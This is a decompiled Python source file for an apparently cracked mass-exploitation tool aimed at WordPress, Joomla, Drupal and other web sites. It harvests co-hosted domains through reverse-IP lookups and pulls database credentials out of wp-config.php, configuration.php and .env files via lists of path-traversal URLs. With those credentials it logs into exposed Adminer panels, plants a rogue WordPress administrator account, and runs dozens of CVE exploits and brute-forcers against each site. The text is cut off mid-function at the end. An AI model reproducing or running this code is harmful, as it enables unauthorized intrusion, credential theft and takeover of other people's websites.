# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.2 (default, Mar 20 2019, 15:02:54) 
# [GCC 8.2.0]
# Embedded file name: C:\Scripts\excute\jmain.py
#Cracked By Black_Phish
YOUR_Email_For_TAkeAdmin_Exploit = open('files/youremail.txt', 'r').read()
from subprocess import check_output
from Tools import cms
import sys, os, threading, time, re, socket
from multiprocessing.dummy import Pool, freeze_support
from random import randint
try:
    import requests
except ImportError:
    print '---------------------------------------------------'
    print '[*] pip install requests'
    print '   [-] you need to install requests Module'
    sys.exit()

try:
    os.mkdir('result')
except:
    pass

try:
    os.mkdir('cms')
except:
    pass

from Exploits import Presta_1attributewizardpro
from Exploits import Presta_advancedslider
from Exploits import Presta_attributewizardpro
from Exploits import Presta_attributewizardpro3
from Exploits import Presta_attributewizardpro_x
from Exploits import Presta_cartabandonmentpro
from Exploits import Presta_columnadverts
from Exploits import Presta_fieldvmegamenu
from Exploits import Presta_homepageadvertise
from Exploits import Presta_homepageadvertise2
from Exploits import Presta_jro_homepageadvertise
from Exploits import Presta_lib
from Exploits import Presta_megamenu
from Exploits import Presta_nvn_export_orders
from Exploits import Presta_pk_flexmenu
from Exploits import Presta_productpageadverts
from Exploits import Presta_psmodthemeoptionpanel
from Exploits import Presta_simpleslideshow
from Exploits import Presta_soopabanners
from Exploits import Presta_soopamobile
from Exploits import Presta_tdpsthemeoptionpanel
from Exploits import Presta_videostab
from Exploits import Presta_vtermslideshow
from Exploits import Presta_wdoptionpanel
from Exploits import Presta_wg24themeadministration
from Exploits import cartabandonmentproOld
from Exploits import cherry_plugin
from Exploits import CVE_2008_3362Download_Manager
from Exploits import CVE_2014_4725wysija
from Exploits import CVE_2014_9735_revsliderShell
from Exploits import wpConfigDownload
from Exploits import CVE_2015_4455_gravityforms
from Exploits import CVE_2015_4455_gravityformsindex
from Exploits import CVE_2015_5151_revsliderCSS
from Exploits import CVE_2017_16562userpro
from Exploits import CVE_2018_19207wp_gdpr_compliance
from Exploits import CVE_2019_9879wp_graphql
from Exploits import formcraft
from Exploits import Headway
from Exploits import pagelinesExploit
from Exploits import WooCommerce_ProductAddonsExp
from Exploits import WpCateGory_page_icons
from Exploits import Wp_addblockblocker
from Exploits import wp_barclaycart
from Exploits import wp_content_injection
from Exploits import wp_eshop_magic
from Exploits import Wp_HD_WebPlayer
from Exploits import Wp_Job_Manager
from Exploits import wp_miniaudioplayer
from Exploits import Wp_pagelines
from Exploits import WP_User_Frontend
from Exploits import viral_optinsExploit
from Exploits import CVE_2019_9978SocialWarfare
from Exploits import WPJekyll_Exporter
from Exploits import Wp_cloudflare
from Exploits import Wprealia
from Exploits import Wpwoocommercesoftware
from Exploits import Wp_enfold_child
from Exploits import Wp_contabileads
from Exploits import Wp_prh_api
from Exploits import Wp_dzs_videogallery
from Exploits import Wp_mmplugin
from Exploits import wpinstall
from Exploits import CVE_2020_8772_wpInfinitewp_authBypass
from Exploits import CVE_2020_25213_wpfilemanager
from Exploits import CVE_2020_2600QuizAndSurveyMasterplugin
from BruteForce import Wordpress
from BruteForce import FTPBruteForce
from Exploits import Com_adsmanager
from Exploits import Com_alberghi
from Exploits import Com_CCkJseblod
from Exploits import Com_extplorer
from Exploits import Com_Fabric
from Exploits import Com_FoxContent
from Exploits import Com_b2jcontact
from Exploits import Com_bt_portfolio
from Exploits import Com_civicrm
from Exploits import Com_jwallpapers
from Exploits import Com_oziogallery
from Exploits import Com_redmystic
from Exploits import Com_simplephotogallery
from Exploits import megamenu
from Exploits import mod_simplefileuploadv1
from Exploits import Com_facileforms
from Exploits import Com_Hdflvplayer
from Exploits import Com_Jbcatalog
from Exploits import Com_JCE
from Exploits import com_jdownloads
from Exploits import Com_JCEindex
from Exploits import Com_Joomanager
from Exploits import Com_Macgallery
from Exploits import com_media
from Exploits import Com_Myblog
from Exploits import Com_rokdownloads
from Exploits import Com_s5_media_player
from Exploits import Com_SexyContactform
from Exploits import CVE_2015_8562RCEjoomla
from Exploits import CVE_2015_8562RCEjoomla2019
from Exploits import CVE_2016_9838TakeAdminJoomla
from BruteForce import Joomla
from Exploits import CVE_2014_3704Drupal_add_Admin
from Exploits import CVE_2018_7600Drupalgeddon2
from Exploits import CVE_2019_6340Drupal8RESTful
from Exploits import Drupal_mailchimp
from Exploits import phpcurlclass
from BruteForce import Drupal
from Exploits import osCommerce
from BruteForce import Opencart
from Exploits import CVE_2019_16759vBulletinRCE
from Exploits import CVE_2006_2529fckeditor
from Exploits import phpunit
from Exploits import env
from Tools import Sqli
scannedips = []
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'

def clear():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][(os.name == 'nt')])


def Rez(site, i):
    try:
        if 'YES' in str(i):
            print (' {}+ {}{} {}--> {}{} {}YES!{}').format(g, w, site, c, y, i[2], g, w)
        else:
            print (' {}- {}{} {}--> {}{} {}NO!{}').format(r, w, site, c, y, i[2], r, w)
    except:
        print (' {}- {}{} {}--> {}{} {}NO!{}').format(r, w, site, c, y, i[2], r, w)


class JEX(object):

    def __init__(self, site):
        try:
            if site.startswith('http://'):
                site = site.replace('http://', '')
            elif site.startswith('https://'):
                site = site.replace('https://', '')
        except:
            pass

        sqli_connector_rez = []
        config_rez = []
        r = '\x1b[31m'
        g = '\x1b[32m'
        y = '\x1b[33m'
        b = '\x1b[34m'
        m = '\x1b[35m'
        c = '\x1b[36m'
        w = '\x1b[37m'
        try:
            IP = socket.gethostbyname(site)
            print ('   {}Grabbing {}=>{} {}').format(g, y, c, IP)
            rev = self.reverseip()
            domains = rev.Reverse_ip(IP)
            if len(domains) != 0:
                print ('   {}Grabbed Domains: {}{} {}from {}=>{} {}').format(g, r, len(domains), w, y, c, IP)
                print ('   {}please Wait! We are Detecting CMS {}=>{} {}').format(w, y, c, IP)
                C = self.CmsDetect()
                wp, jom, unknown = C.Start(domains)
                print ('   {}Scan is Done --> {} {}').format(w, c, IP)
                print ('   {}Wordpress:{} {}').format(w, c, len(wp))
                print ('   {}Joomla:{} {}').format(w, c, len(jom))
                print ('   {}other:{} {}').format(w, c, len(unknown))
                print ('   {}Trying To Exploit targets wait a few minutes... {}=>{} {}').format(w, y, c, IP)
                sql_Connector = self.adminer()
                Con = sql_Connector.start(domains)
                if len(Con) != 0:
                    status = 0
                    print ('   {}WE found {} Sql Connector on this server {}=>{} {}').format(w, len(Con), y, c, IP)
                    for connector in Con:
                        sqli_connector_rez.append(connector)
                        print ('     {} {}').format(g, connector)

                    print ('   {}wait a few minutes... --> {} {}').format(w, c, IP)
                    Wp = self.WpDownloadConfig()
                    configs = Wp.start(wp)
                    if len(configs) != 0:
                        status += 1
                        print ('   {}WE found {} Wordpress Config on this server --> {} {}').format(w, len(configs), c, IP)
                        for config in configs:
                            config_rez.append(config)
                            if len(config) == 5:
                                print ('     {}Host: {}{}').format(w, c, config[1])
                                print ('     {}user: {}{}').format(w, c, config[2])
                                print ('     {}pass: {}{}').format(w, c, config[3])
                                print ('     {}  DB: {}{}').format(w, c, config[4])
                                print w + ' ---------------------------------------------'
                            else:
                                print ('     {}Config path: {}{}').format(w, c, config[0])

                    Jom = self.JomDownloadConfig()
                    jconfigs = Jom.start(wp)
                    if len(jconfigs) != 0:
                        status += 1
                        print ('   {}WE found {} Joomla Config on this server --> {} {}').format(w, len(jconfigs), c, IP)
                        for config in jconfigs:
                            config_rez.append(config)
                            if len(config) == 5:
                                print ('     {}Host: {}{}').format(w, c, config[1])
                                print ('     {}user: {}{}').format(w, c, config[2])
                                print ('     {}pass: {}{}').format(w, c, config[3])
                                print ('     {}  DB: {}{}').format(w, c, config[4])
                                print w + ' ---------------------------------------------'
                            else:
                                print ('     {}Config path: {}{}').format(w, c, config[0])

                    en = self.ENVConfig()
                    envconfigs = en.start(unknown)
                    if len(envconfigs) != 0:
                        status += 1
                        print ('   {}WE found {} laravel Config on this server --> {} {}').format(w, len(envconfigs), c, IP)
                        for config in envconfigs:
                            config_rez.append(config)
                            if len(config) == 5:
                                print ('     {}Host: {}{}').format(w, c, config[1])
                                print ('     {}user: {}{}').format(w, c, config[2])
                                print ('     {}pass: {}{}').format(w, c, config[3])
                                print ('     {}  DB: {}{}').format(w, c, config[4])
                                print w + ' ---------------------------------------------'
                            else:
                                print ('     {}Config path: {}{}').format(w, c, config[0])

                    if status == 0:
                        print ('   {}WE found {} Sql Connector on this server but without config :*(').format(w, len(Con))
                    else:
                        with open('result/ConnectableSql.txt', 'a') as (XW):
                            XW.write(('IP: {}\nConnectors:\n').format(IP))
                            for con in sqli_connector_rez:
                                XW.write(con + '\n')

                            for config in config_rez:
                                if len(config) == 5:
                                    XW.write(('Host: {}\n').format(config[1]))
                                    XW.write(('user: {}\n').format(config[2]))
                                    XW.write(('pass: {}\n').format(config[3]))
                                    XW.write(('DB: {}\n').format(config[4]))
                                    XW.write(' ---------------------------------------------\n')
                                else:
                                    XW.write(('Config path: {}').format(config[0]))
                                    XW.write(' ---------------------------------------------\n')
                                try:
                                    self.AdminerPWN().LoginHTTP(sqli_connector_rez[0], config[2][0], config[3][0], config[4][0])
                                except:
                                    try:
                                        self.AdminerPWN().LoginHTTP(sqli_connector_rez[0], config[2], config[3], config[4])
                                    except:
                                        pass

                print ('   {}Testing Exploits Started...').format(w)
                if len(wp) != 0:
                    WpScan_ = self.WpScan()
                    WpScan_.start(wp)
                if len(jom) != 0:
                    jScan_ = self.jScan()
                    jScan_.start(jom)
                if len(unknown) != 0:
                    uknownScan_ = self.uknownScan()
                    uknownScan_.start(unknown)
            else:
                print ('   {}Grabbing failed 0 target found. {}=>{} {}').format(r, y, w, site)
        except:
            print ('   {}Grabbing failed {}=>{} {}').format(r, y, w, site)

    def Banner(self):
        r = '\x1b[31m'
        g = '\x1b[32m'
        y = '\x1b[33m'
        w = '\x1b[37m'
        bb = open('files/banner.txt', 'r').read()
        print bb.format(r, g, r, w, r, y, w)

    class ENVConfig(object):

        def __init__(self):
            self.data = []

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.Exploit, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

            return self.data

        def Exploit(self, site):
            try:
                CC = requests.get('http://' + site + '/.env', timeout=7, headers=Headers)
                if 'DB_PASSWORD=' in str(CC.content):
                    self.GETDATABase(str(CC.content), site)
                    env.Exploit(site)
            except:
                pass

        def GETDATABase(self, REZ, site):
            try:
                if 'DB_CONNECTION' in REZ:
                    if 'DB_CONNECTION=null' in REZ:
                        pass
                    else:
                        for i in range(20):
                            Host = re.findall('DB_HOST=(.*)', REZ)[i]
                            database = re.findall('DB_DATABASE=(.*)', REZ)[i]
                            user = re.findall('DB_USERNAME=(.*)', REZ)[i]
                            Pass = re.findall('DB_PASSWORD=(.*)', REZ)[i]
                            self.data.append([site + '/.env', Host, user, Pass, database])

            except:
                pass

    class reverseip(object):

        def __init__(self):
            self.urls = []

        def Bing(self, IP, Num):
            try:
                url = 'http://www.bing.com/search?q=ip%3a' + IP + '+&first=' + str(Num) + '&count=50&FORM=PORE'
                cnn = requests.get(url, verify=False, headers=Headers, timeout=7)
                try:
                    finder = re.findall('<h2><a href="(.*?)"', cnn.content)
                    for u in finder:
                        o = u.split('/')
                        dom = o[0] + '//' + o[2]
                        if dom in self.urls:
                            pass
                        else:
                            if dom.startswith('http://'):
                                dom = dom.replace('http://', '')
                            elif dom.startswith('https://'):
                                dom = dom.replace('https://', '')
                            self.urls.append(dom)

                except:
                    pass

            except:
                self.Bing(IP, Num)

        def Reverse_ip(self, IP):
            try:
                pages = []
                i = 0
                while i <= 200:
                    pages.append(str(i))
                    i += 10

                for page in pages:
                    self.Bing(IP, page)

            except:
                pass

            return list(set(self.urls))

    class AdminerPWN:

        def __init__(self):
            pass

        def injectAdminWordpress(self, site, sess, username, db, Type):
            a = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
            T = sess.get(('{}://').format(Type) + site + ('?username={}&db={}').format(username, db), headers=a, timeout=10)
            try:
                find_installedWps = re.findall(';select=(.*)_options" class=', T.content)
                print ('   {}WE found {}{} {}Wordpress Installed on this DB').format(w, c, len(find_installedWps), w)
                print ('   {}Trying inject Admins...').format(w)
                for WPname in find_installedWps:
                    To = sess.get(('{}://').format(Type) + site + ('?username={}&db={}&edit={}_users').format(username, db, WPname), headers=a)
                    Token = re.findall('<input type="hidden" name="token" value="(.*)">', str(To.content))[0]
                    To2 = sess.get(('{}://').format(Type) + site + ('?username={}&db={}&select={}_usermeta').format(username, db, WPname), headers=a)
                    Token2 = re.findall('<input type="hidden" name="token" value="(.*)">', str(To2.content))[0]
                    postHeader = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0', 
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                       'Accept-Language': 'en-US,en;q=0.5', 
                       'Accept-Encoding': 'gzip, deflate', 
                       'Content-Type': 'application/x-www-form-urlencoded', 
                       'Connection': 'keep-alive', 
                       'Upgrade-Insecure-Requests': '1'}
                    DATA = {'fields[ID]': '9999999999', 
                       'function[user_login]': '', 
                       'fields[user_login]': 'escobar', 
                       'function[user_pass]': '', 
                       'fields[user_pass]': '$P$BRlhf1fzMxr3olfFvHp1bUZYJswec4/', 
                       'function[user_nicename]': '', 
                       'function[user_email]': '', 
                       'fields[user_email]': '', 
                       'function[user_url]': '', 
                       'fields[user_url]': '', 
                       'function[user_registered]': '', 
                       'fields[user_registered]': '0000-00-00 00:00:00', 
                       'function[user_activation_key]': '', 
                       'fields[user_activation_key]': '', 
                       'fields[user_status]': '0', 
                       'function[display_name]': '', 
                       'fields[display_name]': '', 
                       'referer': '', 
                       'save': '1', 
                       'token': Token}
                    DATA_META = {'fields[umeta_id]': '', 
                       'fields[user_id]': '9999999999', 
                       'function[meta_key]': '', 
                       'fields[meta_key]': 'wp_capabilities', 
                       'function[meta_value]': '', 
                       'fields[meta_value]': 'a:1:{s:13:"administrator";s:1:"1";}', 
                       'referer': '', 
                       'save': '1', 
                       'token': Token2}
                    sess.post(('{}://').format(Type) + site + ('?username={}&db={}&edit={}_users').format(username, db, WPname), headers=postHeader, timeout=10, data=DATA)
                    sess.post(('{}://').format(Type) + site + ('?username={}&db={}&edit={}_usermeta').format(username, db, WPname), headers=postHeader, timeout=10, data=DATA_META)
                    injectedSite = sess.get(('{}://').format(Type) + site + ('?username={}&db={}&select={}_options').format(username, db, WPname), headers=a, timeout=6)
                    Data = re.findall("rel='noreferrer'>(.*)</a>", injectedSite.content)[0]
                    with open('result/Wp-Installed.txt', 'a') as (writer):
                        writer.write(Data + ('/wp-login.php\n  Username: {}\n  Password: {}\n------------------------------------------\n').format('escobar', '1'))
                    if Data.startswith('http://'):
                        Data = Data.replace('http://', '')
                    elif Data.startswith('https://'):
                        Data = Data.replace('https://', '')
                    WpS = Wordpress.Wordpress()
                    WpS.BruteForce(Data, 'escobar', '1')

            except:
                pass

        def LoginHTTPS(self, site, username, password, db):
            try:
                LH = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0', 
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                   'Accept-Language': 'en-US,en;q=0.5', 
                   'Accept-Encoding': 'gzip, deflate', 
                   'Referer': ('https://{}').format(site), 
                   'Content-Type': 'application/x-www-form-urlencoded', 
                   'Connection': 'keep-alive', 
                   'Upgrade-Insecure-Requests': '1'}
                Data = {'auth[driver]': 'server', 
                   'auth[server]': '', 
                   'auth[username]': username, 
                   'auth[password]': password, 
                   'auth[db]': db}
                sess = requests.session()
                sess.post('https://' + site, timeout=15, headers=LH, data=Data)
                C = sess.get('https://' + site + ('?username={}&db={}').format(username, db), timeout=15, headers=Headers)
                if 'type="submit" name="logout"' in str(C.content):
                    self.injectAdminWordpress(site, sess, username, db, Type='https')
            except:
                pass

        def LoginHTTP(self, site, username, password, db):
            try:
                LH = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0', 
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                   'Accept-Language': 'en-US,en;q=0.5', 
                   'Accept-Encoding': 'gzip, deflate', 
                   'Referer': ('http://{}').format(site), 
                   'Content-Type': 'application/x-www-form-urlencoded', 
                   'Connection': 'keep-alive', 
                   'Upgrade-Insecure-Requests': '1'}
                Data = {'auth[driver]': 'server', 
                   'auth[server]': '', 
                   'auth[username]': username, 
                   'auth[password]': password, 
                   'auth[db]': db}
                sess = requests.session()
                sess.post('http://' + site, timeout=7, headers=LH, data=Data)
                C = sess.get('http://' + site + ('?username={}&db={}').format(username, db), timeout=7, headers=Headers)
                if 'type="submit" name="logout"' in str(C.content):
                    self.injectAdminWordpress(site, sess, username, db, Type='http')
                else:
                    self.LoginHTTPS(site, username, password, db)
            except:
                self.LoginHTTPS(site, username, password, db)

    class CmsDetect(object):

        def __init__(self):
            self.Wordpress = []
            self.Joomla = []
            self.Unknown = []

        def Start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.Check, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

            return (
             self.Wordpress, self.Joomla, self.Unknown)

        def Check(self, site):
            try:
                W = requests.get('http://' + site + '/wp-includes/ID3/license.txt', timeout=5, headers=Headers)
                W2 = requests.get('http://' + site + '/administrator/help/en-GB/toc.json', timeout=5, headers=Headers)
                W3 = requests.get('http://' + site + '/plugins/system/debug/debug.xml', timeout=5, headers=Headers)
                if 'getID3() by James Heinrich <info@getid3.org>' in W.content:
                    self.Wordpress.append(site)
                    open('cms/Wordpress.txt', 'a').write(site + '\n')
                elif '"COMPONENTS_BANNERS_BANNERS"' in W2.content:
                    self.Joomla.append(site)
                    open('cms/Joomla.txt', 'a').write(site + '\n')
                elif '<author>Joomla!' in W3.content:
                    self.Joomla.append(site)
                    open('cms/Joomla.txt', 'a').write(site + '\n')
                else:
                    self.Unknown.append(site)
                    open('cms/Unknown.txt', 'a').write(site + '\n')
            except:
                pass

    class adminer(object):

        def __init__(self):
            self.adminerpage = []

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.STARTSCAN, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

            return self.adminerpage

        def ScanAdminer(self, site, path):
            try:
                SS = requests.get('http://' + site + path, timeout=10, headers=Headers)
                if 'class="jush-sql jsonly hidden"' in str(SS.content):
                    self.adminerpage.append(site + path)
                else:
                    return False
            except:
                return False

        def STARTSCAN(self, site):
            LIST = [
             '/adminer.php',
             '/wp-admin/mysql-adminer.php',
             '/wp-admin/adminer.php',
             '/mysql-adminer.php',
             '/adminer/adminer.php',
             '/uploads/adminer.php',
             '/upload/adminer.php',
             '/adminer/adminer-4.7.0.php',
             '/wp-content/adminer.php',
             '/wp-content/plugins/adminer/inc/editor/index.php',
             '/wp-content/uploads/adminer.php',
             '/adminer/',
             '/_adminer.php',
             '/mirasvit_adminer_mysql.php',
             '/mirasvit_adminer_425.php',
             '/adminer/index.php',
             '/adminer1.php',
             '/mirasvit_adminer_431.php',
             '/mirasvit_adminer-4.2.3.php',
             '/adminer-4.6.2-cs.php',
             '/adminer-4.5.0.php',
             '/adminer-4.3.0.php',
             '/latest.php',
             '/latest-en.php',
             '/latest-mysql.php',
             '/latest-mysql-en.php',
             '/adminer-4.7.0.php']
            thread = []
            for path in LIST:
                t = threading.Thread(target=self.ScanAdminer, args=(site, path))
                t.start()
                thread.append(t)
                time.sleep(0.7)

            for j in thread:
                j.join()

    class WpDownloadConfig(object):

        def __init__(self):
            self.data = []
            self.DowloadConfig = [
             '/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php',
             '/wp-admin/admin-ajax.php?action=cpabc_appointments_calendar_update&cpabc_calendar_update=1&id=../../../../../../wp-config.php',
             '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes',
             '/wp-admin/admin.php?page=multi_metabox_listing&action=edit&id=../../../../../../wp-config.php',
             '/wp-content/force-download.php?file=../wp-config.php',
             '/force-download.php?file=wp-config.php',
             '/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php',
             '/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=lol.pdf&file=../../../../wp-config.php',
             '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mini-mail-dashboard-widgetwp-mini-mail.php?abspath=../../wp-config.php',
             '/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=../../../../wp-config.php',
             '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
             '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../wp-config.php',
             '/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php',
             '/wp-content/plugins/tera-charts/charts/treemap.php?fn=../../../../wp-config.php',
             '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
             '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
             '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
             '/wp-content/plugins/wp-support-plus-responsive-ticket-system/includes/admin/downloadAttachment.php?path=../../../../../wp-config.php',
             '/wp-content/plugins/ungallery/source_vuln.php?pic=../../../../../wp-config.php',
             '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
             '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
             '/wp-content/plugins/mac-dock-gallery/macdownload.php?albid=../../../wp-config.php']

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.Exploit, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

            return self.data

        def Exploitz(self, site, path):
            global flag
            try:
                Exp = 'http://' + site + str(path)
                GetConfig = requests.get(Exp, timeout=10, headers=Headers)
                if 'DB_PASSWORD' in str(GetConfig.content):
                    flag = True
                    try:
                        with open('result/Config_results.txt', 'a') as (ww):
                            ww.write('Full Config Path  : ' + Exp + '\n')
                        try:
                            Gethost = re.findall("'DB_HOST', '(.*)'", str(GetConfig.content))
                            Getuser = re.findall("'DB_USER', '(.*)'", str(GetConfig.content))
                            Getpass = re.findall("'DB_PASSWORD', '(.*)'", str(GetConfig.content))
                            Getdb = re.findall("'DB_NAME', '(.*)'", str(GetConfig.content))
                            self.data.append([site + path, Gethost, Getuser, Getpass, Getdb])
                        except:
                            self.data.append([site + path])

                    except:
                        try:
                            Gethost = re.findall("'DB_HOST', '(.*)'", str(GetConfig.content))
                            Getuser = re.findall("'DB_USER', '(.*)'", str(GetConfig.content))
                            Getpass = re.findall("'DB_PASSWORD', '(.*)'", str(GetConfig.content))
                            Getdb = re.findall("'DB_NAME', '(.*)'", str(GetConfig.content))
                            self.data.append([site + path, Gethost, Getuser, Getpass, Getdb])
                        except:
                            self.data.append([site + path])

            except:
                pass

        def Exploit(self, site):
            global flag
            thread = []
            flag = False
            for path in self.DowloadConfig:
                if not flag == False:
                    return self.data
                t = threading.Thread(target=self.Exploitz, args=(site, path))
                t.start()
                thread.append(t)
                time.sleep(0.7)

            for j in thread:
                j.join()

            if flag == False:
                return 'No'

    class JomDownloadConfig(object):

        def __init__(self):
            self.data = []
            self.DowloadConfig = [
             '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
             '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=',
             '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
             '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
             '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
             '/plugins/content/fsave/download.php?filename=configuration.php',
             '/components/com_portfolio/includes/phpthumb/phpThumb.php?w=800&src=configuration.php',
             '/index.php?option=com_picsell&controller=prevsell&task=dwnfree&dflink=../../../configuration.php',
             '/plugins/system/captcha/playcode.php?lng=configuration.php',
             '/index.php?option=com_rsfiles&task=download&path=../../configuration.php&Itemid=137',
             '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
             '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
             '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
             '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
             '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php',
             '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
             '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
             '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
             '/index.php?option=com_jetext&task=download&file=../../configuration.php',
             '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
             '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
             '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
             '/index.php?option=com_download-monitor&file=configuration.php']

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.Exploit, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

            return self.data

        def Exploitz(self, site, path):
            global flag
            try:
                Exp = 'http://' + site + str(path)
                GetConfig = requests.get(Exp, timeout=10, headers=Headers)
                if 'DB_PASSWORD' in str(GetConfig.content):
                    flag = True
                    try:
                        with open('result/Config_results.txt', 'a') as (ww):
                            ww.write('Full Config Path  : ' + Exp + '\n')
                        Gethost = re.findall("host = '(.*)';", str(GetConfig.content))
                        Getuser = re.findall("user = '(.*)';", str(GetConfig.content))
                        Getpass = re.findall("password = '(.*)';", str(GetConfig.content))
                        Getdb = re.findall("db = '(.*)';", str(GetConfig.content))
                        self.data.append([site + path, Gethost, Getuser, Getpass, Getdb])
                    except:
                        try:
                            Gethost = re.findall("host = '(.*)';", str(GetConfig.content))
                            Getuser = re.findall("user = '(.*)';", str(GetConfig.content))
                            Getpass = re.findall("password = '(.*)';", str(GetConfig.content))
                            Getdb = re.findall("db = '(.*)';", str(GetConfig.content))
                            self.data.append([site + path, Gethost, Getuser, Getpass, Getdb])
                        except:
                            pass

            except:
                pass

        def Exploit(self, site):
            global flag
            thread = []
            flag = False
            for path in self.DowloadConfig:
                if not flag == False:
                    return self.data
                t = threading.Thread(target=self.Exploitz, args=(site, path))
                t.start()
                thread.append(t)
                time.sleep(0.7)

            for j in thread:
                j.join()

            if flag == False:
                return 'No'

    class uknownScan(object):

        def __init__(self):
            pass

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.scan, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

        def scan(self, site):
            try:
                i = phpunit.Exploit(site, 'unknown')
                Rez(site, i)
                i = CVE_2006_2529fckeditor.Exploit(site, 'unknown')
                Rez(site, i)
                i = env.Exploit(site)
                Rez(site, i)
                i = Sqli.Exploit(site)
                Rez(site, i)
                i = wpinstall.Check(site, YOUR_Email_For_TAkeAdmin_Exploit)
                Rez(site, i)
            except:
                print (' {}- {}{} {}--> {} Crashed!{}').format(r, w, site, c, y, w)

    class jScan(object):

        def __init__(self):
            pass

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.scan, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

        def scan(self, site):
            try:
                i = CVE_2015_8562RCEjoomla.Exploit(site)
                Rez(site, i)
                i = CVE_2015_8562RCEjoomla2019.exploit(site)
                Rez(site, i)
                i = CVE_2016_9838TakeAdminJoomla.Exploit(site, YOUR_Email_For_TAkeAdmin_Exploit)
                Rez(site, i)
                i = Com_FoxContent.Exploit(site)
                Rez(site, i)
                i = Com_b2jcontact.Exploit(site)
                Rez(site, i)
                i = mod_simplefileuploadv1.Exploit(site)
                Rez(site, i)
                mkobj = Joomla.JooMLaBruteForce()
                i = mkobj.Run(site)
                Rez(site, i)
                i = env.Exploit(site)
                Rez(site, i)
            except:
                print (' {}- {}{} {}--> {} Crashed!{}').format(r, w, site, c, y, w)

    class WpScan(object):

        def __init__(self):
            pass

        def start(self, domains):
            thread = []
            for domain in domains:
                t = threading.Thread(target=self.scan, args=(domain,))
                t.start()
                thread.append(t)

            for j in thread:
                j.join()

        def scan(self, site):
            try:
                i = CVE_2020_2600QuizAndSurveyMasterplugin.Exploit(site)
                Rez(site, i)
                i = CVE_2020_25213_wpfilemanager.Exploit(site)
                Rez(site, i)
                i = CVE_2020_8772_wpInfinitewp_authBypass.GET_USerS(site)
                Rez(site, i)
